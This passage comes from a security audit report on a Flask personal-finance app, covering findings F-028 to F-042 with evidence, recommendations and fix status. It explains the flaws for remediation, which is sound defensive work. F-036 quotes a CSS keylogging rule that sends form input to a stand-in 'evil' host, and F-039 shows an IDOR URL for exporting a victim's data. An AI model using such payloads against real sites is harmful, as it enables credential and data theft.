  dropped). Two semantically-identical constraints under different
  names is churn that makes the migration chain hard to read.
- **Recommendation:** Write a new migration that: (a) drops any
  leftover `ck_transactions_positive_*` constraint if present
  (idempotent via `DROP CONSTRAINT IF EXISTS`), (b) asserts the
  `ck_transactions_{estimated,actual}_amount` pair is the
  canonical enforcement, (c) is documented as a cleanup migration.
  Update migration #7 to add the `IF EXISTS` guard on its drop
  path so a fresh-env replay works.
- **Status:** Open

### F-028: Audit-log PostgreSQL triggers entirely missing from live DB

- **Severity:** High
- **OWASP:** A09:2021 Security Logging and Monitoring Failures
- **CWE:** CWE-778 (Insufficient Logging)
- **ASVS:** V7.2.1, V7.2.2
- **Source:** S6 (`reports/17-migrations-schema.md` F-S6-C3-01)
- **Location:** Migration `a8b1c2d3e4f5` (declared the infrastructure);
  live production DB at alembic_version `c7e3a2f9b104` (after the
  migration); `system.audit_log` table, `audit_trigger_func()`
  function, and 22 AFTER INSERT/UPDATE/DELETE triggers
- **Description:** Migration `a8b1c2d3e4f5` creates
  `system.audit_log` (11 columns, 3 indexes), a PL/pgSQL function
  `system.audit_trigger_func()`, and 22 AFTER-mutation triggers on
  every financial and auth table. Live DB inspection in S6 returned
  zero rows from all three artifact checks: no `system.audit_log`
  table, no `audit_trigger_func`, no `audit_*` triggers. The
  alembic_version pointer is past this migration, meaning the
  migration is recorded as applied. The infrastructure was either
  (a) manually dropped outside Alembic, (b) the migration partially
  failed on apply and no one noticed, or (c) a downstream migration
  silently removed it.
- **Evidence:**
  ```sql
  -- S6 ran these against live DB:
  SELECT count(*) FROM information_schema.tables
    WHERE table_schema='system' AND table_name='audit_log';
  -- returned 0

  SELECT proname FROM pg_proc WHERE proname='audit_trigger_func';
  -- returned 0 rows

  SELECT tgname FROM pg_trigger WHERE tgname LIKE 'audit_%';
  -- returned 0 rows
  ```
- **Impact:** Every INSERT, UPDATE, and DELETE on financial and auth
  tables in production happens with no row-level audit trail. No
  attribution for "who changed this" exists at the database tier.
  Combined with F-080 (Python-level `log_event()` coverage at 14% of
  mutating routes), the forensic trail for financial changes is
  effectively "the app container's stdout log, which the app
  container can rewrite." Regulatory / subpoena / user-dispute
  scenarios cannot be answered.
- **Recommendation:** Two-step remediation. (1) Create a new
  migration that rebuilds the infrastructure. Use the existing
  `a8b1c2d3e4f5` as the template but add `CREATE SCHEMA IF NOT
  EXISTS system` (F-070) and make every CREATE idempotent
  (`CREATE TABLE IF NOT EXISTS`, `CREATE OR REPLACE FUNCTION`,
  `DROP TRIGGER IF EXISTS ... CREATE TRIGGER`). (2) Add a post-
  migration assertion in `entrypoint.sh` that checks the 22
  triggers exist and refuses to start Gunicorn if they do not.
  This turns the gap into a fail-loud event on the next deploy.
  Cross-reference F-082 (off-host log shipping) -- the trigger logs
  need to flow to a tamper-evident destination for the defense to
  work against attacker class C (compromised dep).
- **Status:** Fixed in C-13 (bf6d7a3, 2026-05-05).
  `migrations/versions/a5be2a99ea14_rebuild_audit_infrastructure.py`
  rebuilds `system.audit_log`, `audit_trigger_func`, and the per-table
  AFTER triggers idempotently (`DROP TRIGGER IF EXISTS` + `CREATE
  TRIGGER` pairs). The canonical table list lives in
  `app/audit_infrastructure.py:AUDITED_TABLES`. `entrypoint.sh`
  asserts the trigger count against `EXPECTED_TRIGGER_COUNT` before
  Gunicorn starts -- a missing trigger is now a fail-loud deploy.

### F-029: Cross-user re-parenting IDOR in update_transaction PATCH

- **Severity:** High
- **OWASP:** A01:2021 Broken Access Control
- **CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)
- **ASVS:** V4.2.1
- **Source:** S1 Subagent B1 (`reports/02a-routes.md` F-B1-01)
- **Location:** `app/routes/transactions.py:183-285`
  (`update_transaction`); `app/schemas/validation.py:20-36`
  (`TransactionUpdateSchema`)
- **Description:** The PATCH handler loads the transaction via the
  ownership helper `_get_owned_transaction(txn_id)`, which correctly
  scopes to the current user. After schema-load, it writes every
  schema-accepted field onto the object with `setattr`:
  ```python
  for field, value in data.items():
      setattr(txn, field, value)
  ```
  `TransactionUpdateSchema` exposes both `pay_period_id` and
  `category_id` as `fields.Integer()` with no cross-user scoping.
  The route never checks that the submitted FK values belong to
  `current_user`. Because the target row exists (just under another
  user), Postgres does not raise IntegrityError; the cross-user FK
  is silently written.
- **Evidence:**
  ```python
  # app/routes/transactions.py:261-270 (abridged)
  data = _update_schema.load(request.form)
  ...
  for field, value in data.items():
      setattr(txn, field, value)
  ```
  Compare with the correct pattern at `create_inline`
  (`transactions.py:585-640`) and `create_transaction`
  (`:643-683`), both of which explicitly verify `account_id`,
  `pay_period_id`, `scenario_id`, `category_id` ownership.
- **Impact:** Any authenticated owner can submit a PATCH with
  another user's `pay_period_id` and/or `category_id` to silently
  re-parent their own transaction into the victim's pay period. The
  transaction then appears on the victim's grid (because grid
  queries filter by `pay_period_id.in_(victim_period_ids)`) and
  participates in the victim's balance projection. Under the
  single-owner deployment the blast radius is smaller (one owner;
  companion role cannot hit this route); under public deployment
  this is a direct cross-tenant data-corruption vulnerability. The
  S4 DAST probe (`reports/15-idor-dast.md`) did not catch this
  because the probe exercised each route as an attacker with NO
  ownership of ANY resource, not as an owner tampering with their
  own row's FK.
- **Recommendation:** After `schema.load`, before the `setattr`
  loop, validate:
  ```python
  if "pay_period_id" in data:
      period = db.session.get(PayPeriod, data["pay_period_id"])
      if not period or period.user_id != current_user.id:
          return "Pay period not found", 404
  if "category_id" in data:
      cat = db.session.get(Category, data["category_id"])
      if not cat or cat.user_id != current_user.id:
          return "Category not found", 404
  ```
  Apply the same pattern to `app/routes/transfers.py:617-667`
  (`update_transfer`) for `category_id`; see F-043. Consider
  removing `pay_period_id` and `category_id` from
  `TransactionUpdateSchema` entirely if "move transaction to
  another period" is not a real UI feature.
- **Status:** Fixed in C-29 (7167d43, 2026-05-08).
  `app/routes/transactions.py:362` calls a new
  `_assert_owned_fk_payload` helper (defined at `:167-179`) which
  validates every cross-user FK in the PATCH payload before any
  setattr. A non-owned `pay_period_id` or `category_id` now returns
  404 instead of silently re-parenting the transaction.
  `app/routes/transfers.py` `update_transfer` and the create paths
  go through the same helper (closed in C-27, F-043).

### F-030: TOTP_ENCRYPTION_KEY has no rotation path

- **Severity:** High
- **OWASP:** A02:2021 Cryptographic Failures
- **CWE:** CWE-320 (Key Management Errors)
- **ASVS:** V6.2.4
- **Source:** Preliminary Finding #6 (workflow); S1 Subagent A
  (`reports/01-identity.md` F-A-03, Medium); S1 Section 1C
  (`reports/07-manual-deep-dives.md` 1C.1.g, confirmed); S7
  (`reports/18-asvs-l2.md` V6.2.4, rated High). Taking S7's higher
  rating for a money app where the remediation blocker (forcing
  every user to re-enroll MFA) makes rotation unacceptable in
  practice.
- **Location:** `app/services/mfa_service.py:18-63`
- **Description:** `get_encryption_key()` returns a single-key
  `Fernet(key)` on every call. The function never uses
  `cryptography.fernet.MultiFernet`, never records a version tag
  on the ciphertext, and no `scripts/rotate_totp_key.py` exists.
  `docs/runbook_secrets.md:11` documents the rotation as destructive:
  "DESTRUCTIVE if changed: all MFA configurations become
  unreadable; users must re-enroll MFA." For a solo owner today
  this is a manageable operational event; for public release it
  becomes a destructive user-visible incident users will resist,
  which means "leave the key in place" becomes the pragmatic
  choice -- which means key compromise is unrecoverable in
  practice.
- **Evidence:**
  ```python
  # app/services/mfa_service.py:18-30
  def get_encryption_key():
      key = os.getenv("TOTP_ENCRYPTION_KEY")
      if not key:
          raise RuntimeError("TOTP_ENCRYPTION_KEY environment variable is not set.")
      return Fernet(key)
  ```
  Grep of `app/` for `MultiFernet` returns zero hits.
- **Impact:** Key compromise scenarios (leaked `.env`, leaked host
  backup, F-023 world-readable `.env`) have no soft remediation.
  The only option is force all MFA users to re-enroll, which
  destroys the backup codes they printed + invalidates whatever
  authenticator app they already registered. In practice this
  means operators will avoid rotation, which means a compromised
  key stays live indefinitely.
- **Recommendation:** Switch `get_encryption_key()` to return a
  `MultiFernet` constructed from a primary `TOTP_ENCRYPTION_KEY`
  plus an optional `TOTP_ENCRYPTION_KEY_OLD` read from the
  environment. `MultiFernet` tries the primary key first for
  encrypt (new writes use the new key) and tries every key for
  decrypt (existing ciphertexts under the old key still read). Add
  a one-shot `scripts/rotate_totp_key.py` that iterates
  `auth.mfa_configs`, decrypts each `totp_secret_encrypted` with
  the multi-key reader, re-encrypts with the primary, and commits.
  Document the rotation procedure in `docs/runbook.md` so the key
  can be rotated without user-visible impact.
- **Status:** Fixed in C-04 (9235464, 2026-05-03).
  `app/services/mfa_service.py:18` imports `MultiFernet`;
  `_build_fernet_list` (`app/services/mfa_service.py:87-119`) reads
  the primary `TOTP_ENCRYPTION_KEY` plus optional
  `TOTP_ENCRYPTION_KEY_OLD` from env, and `_load_cipher`
  (`:123-`) returns the multi-key cipher that encrypts under the
  primary and decrypts under any retired key.
  `scripts/rotate_totp_key.py` iterates `auth.mfa_configs` and
  re-encrypts each row under the primary. Procedure documented in
  `docs/runbook_secrets.md`.

### F-031: MFA setup secret stored in the client-side Flask session cookie

- **Severity:** Medium
- **OWASP:** A02:2021 Cryptographic Failures
- **CWE:** CWE-922 (Insecure Storage of Sensitive Information)
- **ASVS:** V6.1.1
- **Source:** S1 Subagent A (`reports/01-identity.md` F-A-04)
- **Location:** `app/routes/auth.py:365-366` (storage), `:386` (consume)
- **Description:** During MFA setup, the plaintext TOTP secret is
  stored in `flask_session["_mfa_setup_secret"]`. Flask's default
  `SecureCookieSessionInterface` signs the cookie but does NOT
  encrypt it, so the secret sits base64-decodable in the user's
  browser for the duration of the setup flow.
- **Evidence:** `app/config.py` has no `SESSION_TYPE` override, no
  Flask-Session extension, and no server-side session store.
- **Impact:** During the setup window, anyone who can read the Flask
  session cookie (browser extension, shared-computer theft, XSS --
  F-036 leaves style-src open) can decode and recover the plaintext
  TOTP secret, clone the authenticator, and keep persistent access
  even after the user rotates their password.
- **Recommendation:** Store the unconfirmed secret server-side. Add
  a `pending_secret_encrypted` column to `auth.mfa_configs`, write
  the secret there at `mfa_setup`, promote to
  `totp_secret_encrypted` on `mfa_confirm`. Alternative: store an
  opaque session-scoped ID keyed into a short-lived server-side
  table.
- **Status:** Fixed in C-05 (299e687, 2026-05-03).
  `app/models/user.py:310` adds `pending_secret_encrypted`
  (encrypted under the same Fernet/MultiFernet key as
  `totp_secret_encrypted`) and `:317` adds
  `pending_secret_expires_at` for a 15-minute TTL.
  `app/routes/auth.py:951-952` writes the encrypted pending
  secret to the row instead of the signed-but-unencrypted Flask
  session cookie. `mfa_confirm` re-encrypts under the primary
  key on promote so the active credential never depends on a
  retired key.

### F-032: MFA disable does not invalidate other sessions

- **Severity:** Medium
- **OWASP:** A07:2021 Identification and Authentication Failures
- **CWE:** CWE-613
- **ASVS:** V2.5.7
- **Source:** S1 Subagent A (`reports/01-identity.md` F-A-05)
- **Location:** `app/routes/auth.py:472-521`
- **Description:** The disable flow correctly re-authenticates
  (password + TOTP), clears the MFA fields, and commits, but does
  NOT set `session_invalidated_at`. A user who disables MFA
  because they suspect a session is compromised has done nothing
  to invalidate that session.
- **Evidence:** The block at `:513-519` calls
  `db.session.commit()` and returns a redirect; no
  `session_invalidated_at = datetime.now(...)` write.
- **Impact:** The attacker session keeps the password-only login
  and now has no TOTP gate. CLAUDE.md lists "MFA state change" as
  a session-invalidation trigger alongside password change.
- **Recommendation:** Immediately after the commit at line 516,
  add `current_user.session_invalidated_at =
  datetime.now(timezone.utc)` and a second commit, then refresh
  `flask_session["_session_created_at"]` so the current session
  survives. Same pattern as `/change-password:214-222`.
- **Status:** Fixed in C-08 (d5fa2f7, 2026-05-04).
  `app/routes/auth.py:1262` calls `invalidate_other_sessions(
  current_user, "mfa_disabled")` after `mfa_disable_confirm` commits;
  the helper writes `session_invalidated_at = now()` and refreshes
  `_session_created_at`. Same helper as F-003 / F-002, applied
  consistently across the auth blueprint.

### F-033: No account lockout beyond IP rate-limiting

- **Severity:** Medium
- **OWASP:** A07:2021 Identification and Authentication Failures
- **CWE:** CWE-307 (Improper Restriction of Excessive Authentication
  Attempts)
- **ASVS:** V2.2.1
- **Source:** S1 Subagent A (`reports/01-identity.md` F-A-06); S1
  Section 1C (`reports/07-manual-deep-dives.md` check 1C.8 grep
  confirmed zero lockout columns or code)
- **Location:** `app/routes/auth.py:73-132` (login);
  `app/services/auth_service.py:294-312` (authenticate);
  `app/models/user.py` (no lockout columns)
- **Description:** The only defense on `/login` is the
  Flask-Limiter decorator `5 per 15 minutes` keyed on
  `get_remote_address`. Grep of `app/` and migrations for
  `failed_login|lockout|account_locked|login_attempts` returns zero
  matches. The `User` model has no `failed_login_count` or
  `locked_until` column. An attacker rotating IPs (residential
  proxy, RFC 1918 spoofing per F-015) is unthrottled at the
  application layer.
- **Evidence:** Grep output recorded in 1C.8.
- **Impact:** Credential stuffing against a known email is
  minimally throttled. Per F-015, a co-tenant on homelab can
  rotate `X-Forwarded-For` to bypass the IP key entirely. The
  single-user argument breaks the moment a second real user
  enrolls (companion role) or the app goes public.
- **Recommendation:** Add `failed_login_count` and `locked_until`
  columns to `auth.users` via migration. In `authenticate()`
  increment on wrong password; reset on success; on threshold
  (e.g. 10) set `locked_until = now + 15min`. A per-account
  counter does not depend on Flask-Limiter's storage or IP trust.
- **Status:** Fixed in C-11 (6e4757c, 2026-05-05).
  `app/models/user.py:110-122` adds `failed_login_count` (NOT NULL,
  CHECK >= 0) and `locked_until` (timezone-aware DateTime) columns.
  `app/services/auth_service.py:86` performs the strict
  `locked_until > now` lockout check before bcrypt; bad-password
  paths increment the counter, successful authentication resets it,
  and crossing the threshold sets `locked_until`. The flow is
  per-account so it is independent of Flask-Limiter storage and
  X-Forwarded-For trust.

### F-034: Flask-Limiter in-memory backend drifts under multi-worker Gunicorn

- **Severity:** Medium
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-770 (Allocation of Resources Without Limits or
  Throttling)
- **ASVS:** V2.2.1
- **Source:** Preliminary Finding #4; S1 Subagent C
  (`reports/03-config-deploy.md` F-C-09); S1 Section 1C 1C.5
  quantification; S2 Section 1D (`reports/08-runtime.md` F-D-I3
  confirms at runtime); S7 (`reports/18-asvs-l2.md` V2.2.1 Partial)
- **Location:** `app/extensions.py:31`;
  `gunicorn.conf.py:24` (workers=2);
  `docker-compose.yml:71` (GUNICORN_WORKERS=2 default)
- **Description:** `Limiter(key_func=get_remote_address,
  default_limits=[], storage_uri="memory://")`. Each worker holds a
  private counter dict, so the documented per-IP limit is silently
  multiplied by the worker count. Container restart resets both
  counters. `default_limits=[]` leaves every un-decorated endpoint
  uncapped (only 4 routes have a `@limiter.limit` decorator).
- **Evidence:** 1C.5 quantification table:

  | Endpoint | Documented | Effective (workers=2) |
  |---|---|---|
  | POST /login | 5/15min | 10/15min |
  | POST /register | 3/hour | 6/hour |
  | POST /mfa/verify | 5/15min | 10/15min |
- **Impact:** Combined with F-015 (IP spoofing via RFC 1918
  trust), the per-IP keying is defeated and auth brute-force
  protection is effectively zero. Separately, only 4 of ~93
  mutating routes have any rate limit at all.
- **Recommendation:** Three independent fixes, combine as desired:
  (a) Move to Redis storage via `storage_uri="redis://..."`;
  counters are shared across workers and survive restart. Adds
  one ~10MB container. (b) Alternatively enforce `workers=1` in
  prod and document. (c) Regardless of (a)/(b), add
  `default_limits=["200 per hour", "30 per minute"]` at the
  Limiter constructor so every route has a ceiling. Addresses
  F-033 residual and many authenticated-endpoint DoS paths.
- **Status:** Fixed in C-06 (2026-05-03). Implemented option (a) +
  option (c).  Production now resolves rate-limit storage from
  ``app.config["RATELIMIT_STORAGE_URI"]`` (ProdConfig defaults to
  ``redis://redis:6379/0`` and rejects ``memory://`` at startup),
  pointing at a hardened ``redis:7.4-alpine`` sibling container on
  the backend Docker network (read-only fs, cap_drop ALL,
  no-new-privileges, mem_limit 96M, no persistence -- counters
  evaporate on Redis restart by design).  ``BaseConfig.RATELIMIT_DEFAULT
  = "200 per hour;30 per minute"`` puts a per-IP ceiling on every
  un-decorated route (closes the "4 of 93 mutating routes" gap).  The
  developer chose fail-closed (Phase D-12):
  ``RATELIMIT_IN_MEMORY_FALLBACK_ENABLED = False`` and
  ``RATELIMIT_SWALLOW_ERRORS = False`` so a Redis outage surfaces as
  500 (via the existing Flask error handler) rather than silently
  falling back to per-worker memory.  ``moving-window`` strategy
  closes the fixed-window straddling gap.  ``/health`` exempted via
  ``@limiter.exempt`` so Docker / Nginx healthcheck loops do not
  consume the per-IP budget.  Tests:
  ``tests/test_config.py::TestRateLimitConfig`` (12 assertions) and
  ``tests/test_integration/test_rate_limiter.py`` (8 behaviors
  including the fail-closed storage-outage simulation).

### F-035: PERMANENT_SESSION_LIFETIME unset -- default 31 days

- **Severity:** Medium
- **OWASP:** A07:2021 Identification and Authentication Failures
- **CWE:** CWE-613 (Insufficient Session Expiration)
- **ASVS:** V3.3.1
- **Source:** S1 Subagent C (`reports/03-config-deploy.md` F-C-07)
- **Location:** `app/config.py` (absent from all config classes)
- **Description:** Flask's default `PERMANENT_SESSION_LIFETIME`
  is 31 days. Any session marked permanent (Flask-Login sets
  this on login) gets the 31-day cookie lifetime. Compounded by
  F-006 (30-day remember-me) and F-002 (pending-MFA state has
  no internal timeout), a stolen browser profile has ~30-31
  days of unattended access.
- **Evidence:** Grep of `app/` for `PERMANENT_SESSION_LIFETIME`
  returns zero hits.
- **Impact:** Long-lived authenticated state on any shared or
  stolen device. For a money app the default is too generous.
- **Recommendation:** Set `PERMANENT_SESSION_LIFETIME =
  timedelta(hours=12)` in `BaseConfig`. Make it
  env-configurable if desired. Pair with F-006 idle-timeout
  check.
- **Status:** Fixed in C-10 (2509357, 2026-05-04).
  `app/config.py:76` sets `PERMANENT_SESSION_LIFETIME` (env-tunable)
  and is paired with the idle-timeout check shipped for F-006.

### F-036: CSP allows 'unsafe-inline' in style-src

- **Severity:** Medium
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers)
- **ASVS:** V14.5.1
- **Source:** Preliminary Finding #3; S1 Subagent C
  (`reports/03-config-deploy.md` F-C-03)
- **Location:** `app/__init__.py:423`
- **Description:** The response CSP header includes
  `style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net
  https://fonts.googleapis.com`. `unsafe-inline` in `style-src`
  allows CSS-based data exfiltration attacks (attribute-
  selector keylogging: `input[value^="a"] { background:
  url(//evil/a) }`), inline style injection, and
  `expression()` on older browsers. `script-src` correctly
  excludes `unsafe-inline`, which blocks classic XSS, but the
  CSS hole is still available.
- **Evidence:**
  ```python
  "style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net
   https://fonts.googleapis.com; "
  ```
- **Impact:** An attacker who achieves HTML injection anywhere
  untrusted data renders (input echoes, flash messages, error
  pages rendered with raw strings) can exfiltrate form-input
  values via CSS attribute-selector tricks. For a money app
  with login credentials and MFA codes on the same page, this
  is a real data-exfil path.
- **Recommendation:** Inventory inline `style=""` and `<style>`
  blocks in `app/templates/` (grep), move them to
  `app/static/css/app.css`, then drop `'unsafe-inline'` from
  `style-src`. If any dynamic styles remain unavoidable, use a
  per-request CSP nonce.
- **Status:** Fixed in C-02 (83af237, 2026-05-02).
  `app/__init__.py:748-771` reconstructs the CSP without
  `'unsafe-inline'` in `style-src` ("Styles: self only.  No
  'unsafe-inline'..."); the 92 inline `style=""` attributes were
  migrated to CSS utility classes in `app/static/css/app.css`, with
  dynamic progress widths driven by `data-progress-pct` and
  `app/static/js/progress_bar.js`.

### F-037: CSP allows external CDN origins without SRI enforcement

- **Severity:** Medium
- **OWASP:** A08:2021 Software and Data Integrity Failures
- **CWE:** CWE-494 (Download of Code Without Integrity Check)
- **ASVS:** V10.3.2, V14.2.3
- **Source:** Preliminary Finding #3; S1 Subagent C
  (`reports/03-config-deploy.md` F-C-04); S7
  (`reports/18-asvs-l2.md` V10.3.2 + V14.2.3)
- **Location:** `app/__init__.py:422-424`;
  `app/templates/base.html:12-20, 259-264` (template link/script
  tags for CDN resources)
- **Description:** CSP lists `https://cdn.jsdelivr.net`,
  `https://unpkg.com`, `https://fonts.googleapis.com`, and
  `https://fonts.gstatic.com` as permitted origins for scripts,
  styles, and fonts. CSP alone permits these origins without
  compelling `integrity="..."` on the `<link>`/`<script>` tags.
  S7 confirmed SRI is applied to Bootstrap CSS/JS and htmx but
  missing on Bootstrap Icons CSS. `require-sri-for script style`
  is not in the CSP.
- **Evidence:** Grep of `app/templates/base.html` shows 4 CDN
  `<link>`/`<script>` tags; one (Bootstrap Icons) has no
  `integrity=` attribute.
- **Impact:** A compromise at jsdelivr, unpkg, Google Fonts, or
  the Bootstrap Icons CDN would let a drive-by attacker replace
  the JS/CSS/font assets served to every Shekel user.
  `script-src` is the sensitive one -- jsdelivr shipping a
  malicious HTMX or Bootstrap build gives the attacker immediate
  code execution in the authenticated origin.
- **Recommendation:** Preferred fix: vendor the CDN assets into
  `app/static/vendor/`, update templates to use
  `url_for("static", ...)`, strip external origins from the CSP.
  Minimum fix: add SRI to every CDN tag, then add `require-sri-
  for script style` to the CSP string.
- **Status:** Fixed in C-02 (83af237, 2026-05-02).
  Bootstrap 5.3.8, Bootstrap Icons 1.11.3, htmx 2.0.4, Chart.js
  4.4.7, Inter and JetBrains Mono variable fonts are vendored
  under `app/static/vendor/` (see `VERSIONS.txt`); the runbook
  documents the CDN-refresh procedure. `app/__init__.py:748`
  CSP "drop CDN origins" -- jsdelivr/unpkg/google-fonts removed
  from script/style-src.

### F-038: login_manager.session_protection not set to "strong"

- **Severity:** Medium
- **OWASP:** A07:2021 Identification and Authentication Failures
- **CWE:** CWE-384 (Session Fixation)
- **ASVS:** V3.2.1
- **Source:** S1 Subagent A (`reports/01-identity.md` F-A-11,
  Info for current cookie-session model); S7
  (`reports/18-asvs-l2.md` V3.2.1 Partial). S7's Partial rating
  takes precedence.
- **Location:** `app/extensions.py:22-25`
- **Description:** `LoginManager()` is instantiated without
  `session_protection = "strong"`. Flask-Login defaults to
  `"basic"`, which only invalidates sessions that change IP or
  User-Agent mid-session. Flask's stateless signed-cookie model
  already resists classic session fixation, so the practical
  impact is limited, but ASVS L2 V3.2.1 requires an explicit
  rotation mechanism on privilege-state change.
- **Evidence:**
  ```python
  # app/extensions.py:22-25
  login_manager = LoginManager()
  login_manager.login_view = "auth.login"
  login_manager.login_message_category = "warning"
  # No login_manager.session_protection = "strong"
  ```
- **Impact:** If the project ever migrates to a server-side
  session store (Flask-Session with Redis), the missing
  `"strong"` becomes a real session-fixation gap. Today the
  practical exposure is Low; recorded as Medium for ASVS
  compliance.
- **Recommendation:** Add
  `login_manager.session_protection = "strong"` at
  `app/extensions.py:22-25`. One line.
- **Status:** Fixed in C-07 (2026-05-04).
  ``app/extensions.py`` now sets
  ``login_manager.session_protection = "strong"`` immediately after
  the ``LoginManager`` instantiation.  Under strong mode,
  Flask-Login's ``_session_protection_failed`` (see
  ``flask_login/login_manager.py``) pops every key in
  ``flask_login.config.SESSION_KEYS`` from the session AND sets
  ``session["_remember"] = "clear"`` whenever the per-request
  identifier (``sha512(remote_addr || "|" || user_agent)``) drifts
  from the value stored at ``login_user()`` time -- forcing a
  complete re-authentication and clearing the remember-me cookie via
  the after-request hook.  The default ``"basic"`` mode only flipped
  ``session["_fresh"]`` to False and left the rest of the session
  populated, which is the gap ASVS L2 V3.2.1 marked Partial.
  Regression tests:
  ``tests/test_config.py::TestLoginManagerConfig::test_login_manager_session_protection_is_strong``
  (static inspection) and
  ``tests/test_adversarial/test_session_protection.py``
  (behavioural -- six end-to-end tests covering REMOTE_ADDR drift,
  User-Agent drift, X-Forwarded-For drift on the proxy-aware code
  path, the unchanged-fingerprint control case, full session-key
  pop on drift, and remember-me cookie clearing on drift).

### F-039: analytics.calendar_tab passes raw account_id to service without ownership check

- **Severity:** Medium
- **OWASP:** A01:2021 Broken Access Control
- **CWE:** CWE-639
- **ASVS:** V4.2.1
- **Source:** S1 Subagent B1 (`reports/02a-routes.md` F-B1-02)
- **Location:** `app/routes/analytics.py:49-102`
- **Description:** The route reads
  `account_id = request.args.get("account_id", None, type=int)`
  and passes it to `calendar_service.get_year_overview(user_id,
  year, account_id, ...)`. The route never verifies
  `account_id` belongs to `current_user`. The
  `calendar_service` is relied on to intersect `user_id` with
  `account_id` internally. Every route-boundary Marshmallow
  check and every route-boundary ownership helper is bypassed.
- **Evidence:** Read of `app/routes/analytics.py:49-102` shows
  no `Account.user_id` check.
- **Impact:** If `calendar_service.get_year_overview` filters
  only by `account_id` without re-joining `user_id`, a URL like
  `/analytics/calendar?account_id=<victim_account>&format=csv`
  exfiltrates the victim's calendar as a download. The CSV
  export path bypasses template-level scoping entirely.
- **Recommendation:** After reading `account_id`, validate:
  ```python
  if account_id is not None:
      acct = db.session.get(Account, account_id)
      if not acct or acct.user_id != current_user.id:
          return "", 404
  ```
  Apply the same fix to `variance_tab` for `period_id`; see
  F-099. See also F-044 (account-type global table) for a
  separate ownership issue on the same blueprint.
- **Status:** Fixed in C-30 (a45029a, 2026-05-08).
  `app/routes/analytics.py:129-` adds the route-boundary ownership
  check on `account_id` for `calendar_tab`, replacing the silent
  fall-through to the user's default account with a 404. The same
  pattern is applied to `variance_tab` for `period_id` at
  `app/routes/analytics.py:220-` (F-098).

### F-040: debt_strategy.calculate parses POST form without Marshmallow schema

- **Severity:** Medium
- **OWASP:** A03:2021 Input Validation
- **CWE:** CWE-20
- **ASVS:** V5.1.3
- **Source:** S1 Subagent B1 (`reports/02a-routes.md` F-B1-03)
- **Location:** `app/routes/debt_strategy.py:222-356`
- **Description:** The POST handler hand-parses
  `extra_monthly`, `strategy`, and `custom_order` from
  `request.form.get()` with inline `try/except`. Project
  coding standards require every state-changing route to
  validate through Marshmallow. Missing: range validation on
  `extra_monthly`, upper-bound on the length of
  `custom_order`, upper-bound on `extra_monthly` magnitude.
- **Evidence:**
  ```python
  extra_raw = request.form.get("extra_monthly", "0").strip()
  try:
      extra_monthly = Decimal(extra_raw)
  except InvalidOperation:
      ...
  strategy = request.form.get("strategy", STRATEGY_AVALANCHE)
  custom_raw = request.form.get("custom_order", "").strip()
  try:
      custom_order = [int(x.strip()) for x in custom_raw.split(",")]
  except ValueError:
      ...
  ```
- **Impact:** Read-only today (no DB writes), but the
  no-schema pattern means any future side-effect added to the
  handler inherits the gap. `custom_order` has no length cap,
  so a long comma-separated string forces `calculate_strategy`
  through a potentially huge list -- a latent availability
  issue.
- **Recommendation:** Add `DebtStrategyCalculateSchema` with
  `extra_monthly = fields.Decimal(required=True, places=2,
  as_string=True, validate=Range(min=0,
  max=Decimal("1000000")))`, `strategy = fields.String(
  validate=OneOf(list(_VALID_STRATEGIES)))`, and
  `custom_order = fields.String(allow_none=True,
  validate=Length(max=500))`. Parse the custom order inside
  the route after schema validation.
- **Status:** Fixed in C-27 (584a688, 2026-05-08).
  `app/schemas/validation.py:377` adds `DebtStrategyCalculateSchema`
  with the recommended Range/OneOf/Length validators and a custom
  pre-load that splits the comma-separated `custom_order` into
  bounded ints. `app/routes/debt_strategy.py` `calculate` now loads
  through the schema before any service call, eliminating the
  latent input-validation gap.

### F-041: Auth blueprint parses credentials without Marshmallow schemas

- **Severity:** Medium
- **OWASP:** A01:2021 + A03:2021
- **CWE:** CWE-20
- **ASVS:** V5.1.3
- **Source:** S1 Subagent B1 (`reports/02a-routes.md` F-B1-04)
- **Location:** `app/routes/auth.py:73-132`, `:151-188`,
  `:201-228`, `:250-344`, `:377-427`, `:472-521`
- **Description:** Every auth-blueprint POST (login,
  register, change_password, mfa_verify, mfa_confirm,
  mfa_disable_confirm) parses credentials directly via
  `request.form.get(...)` with no Marshmallow schema. The
  service layer enforces the 72-byte bcrypt cap via
  `hash_password`, but no email-format or email-length
  validation runs at the route boundary. `CompanionCreateSchema`
  applies strict `validate.Length(max=255)` and email regex --
  the owner's own registration path does not.
- **Evidence:** Grep of `app/routes/auth.py` for
  `request.form.get(` returns 15+ hits across 6 handlers; no
  `schema.load(request.form)` call exists in the file.
- **Impact:** An email over 255 bytes sails past the route,
  hits the DB at commit time, and produces an IntegrityError
  instead of a clean 400 validation error. A companion's
  credentials are validated more strictly than an owner's --
  an asymmetric enforcement that makes no sense for a money
  app.
- **Recommendation:** Define `LoginSchema`, `RegisterSchema`,
  `ChangePasswordSchema`, `MfaVerifySchema`,
  `MfaConfirmSchema`, and `MfaDisableSchema` in
  `app/schemas/validation.py`. Extract the shared email and
  password rules from `CompanionCreateSchema` into a mixin
  so the owner and companion paths enforce identical rules.
- **Status:** Fixed in C-26 (b8b8d51, 2026-05-08).
  `app/schemas/validation.py:2088` `LoginSchema`, `:2127`
  `RegisterSchema`, `:2182` `ChangePasswordSchema`, `:2246`
  `MfaVerifySchema` (plus `MfaConfirmSchema` and `MfaDisableSchema`)
  share `_AuthFormSchema` and a common email/password rule mixin so
  owner and companion paths enforce identical rules. Every
  `auth_service` / `mfa_service` entry point is now loaded through
  a schema before invocation. `MfaVerifySchema` adds an explicit
  length cap closing F-163.

### F-042: mark_done / mark_paid accept actual_amount via raw form parse

- **Severity:** Medium
- **OWASP:** A03:2021 Input Validation
- **CWE:** CWE-20
- **ASVS:** V5.1.3
- **Source:** S1 Subagent B1 (`reports/02a-routes.md` F-B1-05)
- **Location:** `app/routes/transactions.py:288-370`,
  `app/routes/dashboard.py:44-99, :156-168`
- **Description:** Three handlers hand-parse `actual_amount`
  via `Decimal(request.form.get("actual_amount"))` inside
  `try/except (InvalidOperation, ValueError,
  ArithmeticError)`. None enforces a range constraint.
  `Decimal("-9999999999")` or `Decimal("1E+100")` reaches the
  DB where it may hit the `Numeric(12,2)` CHECK (clean 400) or
  raise `InvalidOperation` during rounding (500). The project
